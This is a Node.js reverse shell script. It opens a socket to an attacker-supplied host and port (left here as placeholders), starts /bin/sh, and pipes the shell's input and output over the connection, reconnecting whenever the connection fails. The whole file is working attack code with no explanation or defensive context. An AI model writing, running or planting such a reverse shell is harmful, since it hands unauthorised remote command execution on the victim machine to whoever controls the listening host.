var net = require('net');
var spawn = require('child_process').spawn;
HOST="ip_addr";
PORT="port";
TIMEOUT="5000";
if (typeof String.prototype.contains === 'undefined') { 
    String.prototype.contains = function(it) { 
        return this.indexOf(it) != -1; 
    }; 
}
function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var sh = spawn('/bin/sh',[]);
        client.write("Connected!\n");
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
        sh.on('exit', function(code,signal){
            client.end("Disconnected!\\n");
        });
    });
    client.on('error', function(e) {
        setTimeout(c(HOST,PORT), TIMEOUT);
    });
}
c(HOST,PORT);